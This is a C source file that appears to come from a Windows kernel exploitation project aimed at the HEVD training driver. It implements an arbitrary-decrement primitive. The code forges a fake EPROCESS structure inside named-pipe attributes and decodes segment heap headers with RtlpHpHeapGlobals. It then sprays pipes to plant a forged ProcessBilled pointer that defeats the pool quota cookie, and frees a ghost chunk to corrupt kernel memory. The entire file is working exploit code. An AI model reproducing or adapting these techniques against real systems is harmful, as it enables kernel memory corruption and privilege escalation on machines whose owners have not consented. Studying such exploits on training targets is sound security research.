#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "primitives/arbitrary_decrement.h"

#include "primitives/arbitrary_read.h"
#include "pipe_utils/pipe_utils.h"
#include "hevd/hevd.h"

uintptr_t allocFakeEprocess(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs, char* fake_eprocess_buf)
{
    // Set attribute name
    char fake_eprocess_attribute[0x1000] = { 0 };
    memcpy(fake_eprocess_attribute + DUMB_ATTRIBUTE_NAME_LEN, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
    strcpy_s(fake_eprocess_attribute, DUMB_ATTRIBUTE_NAME_LEN, DUMB_ATTRIBUTE_NAME);

    // Store arbitrary data in the kernel using a pipe attribute, as the pipe queue entry list is corrupted
    SetPipeAttribute(ghost_pipe, fake_eprocess_attribute, DUMB_ATTRIBUTE_NAME_LEN + FAKE_EPROCESS_SIZE);

    // Locate the attribute containing our arbitrary data by reading the Blink pointer of the root
    uintptr_t fake_eprocess_attribute_addr;
    ArbitraryRead(ghost_pipe, addrs->root_pipe_attribute + offsetof(LIST_ENTRY, Blink), (char*)&fake_eprocess_attribute_addr, 0x8);
    printf("[+] fake_eprocess_attribute: 0x%llx\n", fake_eprocess_attribute_addr);

    // Retrieve the address of the fake EPROCESS from the AttributeValue field of the pipe attribute
    uintptr_t fake_eprocess;
    ArbitraryRead(ghost_pipe, fake_eprocess_attribute_addr + offsetof(pipe_attribute_t, AttributeValue), (char*)&fake_eprocess, 0x8);
    return fake_eprocess + FAKE_EPROCESS_OFFSET;
}

int setupFakeEprocess(char* fake_eprocess_buf, uintptr_t addr_to_decrement)
{

    /* initFakeEprocess
    from: https://github.com/cbayet/Exploit-CVE-2017-6008/blob/95ee99c7/Win10/src/CVE-2017-6008_Win10_Exploit.cpp#L205-L232*/
    memset((PVOID)fake_eprocess_buf, 0x41, FAKE_EPROCESS_SIZE);

    PVOID addr = (PVOID)((DWORD64)fake_eprocess_buf + FAKE_EPROCESS_OFFSET);

    memset((char*)addr - 0x40, 0xA, 0x40);
    memset((char*)addr - 0x18, 0xB, 0x1);

    memset(addr, 0x3, 1);

    // Set address to decrement in fake structure
    memcpy((char*)addr + EPROCESS_QUOTA_BLOCK_OFFSET, &addr_to_decrement, sizeof(DWORD64));

    return 1;
}

int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    ArbitraryRead(pipes->ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
    printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);

    puts("[*] Searching for allocated VS header to locate subsegment...");
    size_t vs_header_addr = addrs->ghost_vs_chunk + NEXT_CHUNK_OFFSET;
    addrs->vs_sub_segment = 0;
    do
    {
        uint64_t encoded_vs_header[2];

        ArbitraryRead(pipes->ghost_pipe, vs_header_addr, (char*)&encoded_vs_header, sizeof(uint64_t));
        ArbitraryRead(pipes->ghost_pipe, vs_header_addr + 8, (char*)(&encoded_vs_header) + 8, sizeof(uint64_t));

        encoded_vs_header[0] = encoded_vs_header[0] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;
        encoded_vs_header[1] = encoded_vs_header[1] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;

        HEAP_VS_CHUNK_HEADER* vs_header = (HEAP_VS_CHUNK_HEADER*)&encoded_vs_header;
        printf("[*] vs_header_addr: 0x%llX\n\theader->Allocated: 0x%x\n\theader->UnsafePrevSize: 0x%x\n\theader->UnsafeSize: 0x%x\n\theader->EncodedSegmentPageOffset: 0x%x\n",
            vs_header_addr, vs_header->Allocated, vs_header->UnsafePrevSize, vs_header->UnsafeSize, vs_header->EncodedSegmentPageOffset);

        if (vs_header->Allocated)
        {
            addrs->vs_sub_segment = vs_header_addr - ((uintptr_t)vs_header->EncodedSegmentPageOffset << 12) & ~0xfffll;
            printf("[+] vs_sub_segment: 0x%llX\n", addrs->vs_sub_segment);
        }

        vs_header_addr += vs_header->UnsafeSize * 0x10;
    } while (!addrs->vs_sub_segment);

    return 1;
}

int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t addr_to_decrement)
{
    // Prepare fake EPROCESS attribute
    char fake_eprocess_buf[0x1000] = { 0 };
    setupFakeEprocess(fake_eprocess_buf, addr_to_decrement - 0x1);

    // Allocate and locate fake EPROCESS
    addrs->fake_eprocess = allocFakeEprocess(pipes->ghost_pipe, addrs, fake_eprocess_buf);
    printf("[+] Fake EPROCESS address: 0x%llX\n", addrs->fake_eprocess);

    HEAP_VS_CHUNK_HEADER new_vs_header = { 0 };
    new_vs_header.Allocated = 0x1;
    new_vs_header.UnsafePrevSize = PREV_CHUNK_OFFSET / 0x10;
    new_vs_header.UnsafeSize = NEXT_CHUNK_OFFSET / 0x10;
    new_vs_header.EncodedSegmentPageOffset = (addrs->ghost_vs_chunk - addrs->vs_sub_segment) >> 12 & 0xff;

    uint64_t* new_encoded_vs_header = (uint64_t*)&new_vs_header;
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;

    vs_chunk_t fake_process_billed_chunk = { 0 };
    fake_process_billed_chunk.encoded_vs_header[0] = new_encoded_vs_header[0];
    fake_process_billed_chunk.encoded_vs_header[1] = new_encoded_vs_header[1];
    fake_process_billed_chunk.pool_header.PreviousSize = 0;
    fake_process_billed_chunk.pool_header.PoolIndex = 0;
    fake_process_billed_chunk.pool_header.BlockSize = 0x100 / 0x10;
    fake_process_billed_chunk.pool_header.PoolType = 8;
    fake_process_billed_chunk.pool_header.PoolTag = 0x42424242;
    fake_process_billed_chunk.pool_header.ProcessBilled = addrs->fake_eprocess ^ addrs->ExpPoolQuotaCookie ^ (addrs->ghost_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER));
    fake_process_billed_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
    fake_process_billed_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
    fake_process_billed_chunk.pipe_queue_entry.linkedIRP = 0;
    fake_process_billed_chunk.pipe_queue_entry.SecurityClientContext = 0;
    fake_process_billed_chunk.pipe_queue_entry.isDataInKernel = 0;
    fake_process_billed_chunk.pipe_queue_entry.DataSize = 0;
    fake_process_billed_chunk.pipe_queue_entry.remaining_bytes = 0;
    fake_process_billed_chunk.pipe_queue_entry.field_2C = 0x43434343;

    puts("[*] Spraying pipes with fake ProcessBilled...");
    uintptr_t pipe_queue_entry_addr = NULL;
    do
    {
        FreeNPPNxChunk(pipes->previous_pipe, TARGETED_VULN_SIZE - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(pipe_queue_entry_t));
        AllocNPPNxChunk(pipes->previous_pipe, &fake_process_billed_chunk, TARGETED_VULN_SIZE - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(pipe_queue_entry_t));
        ArbitraryRead(pipes->ghost_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
    } while (pipe_queue_entry_addr == addrs->ghost_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER));

    puts("[*] Freeing ghost chunk to trigger arbitrary decrement");
    FreeNPPNxChunk(pipes->ghost_pipe, GHOST_CHUNK_BUFSIZE);

    return 1;
}
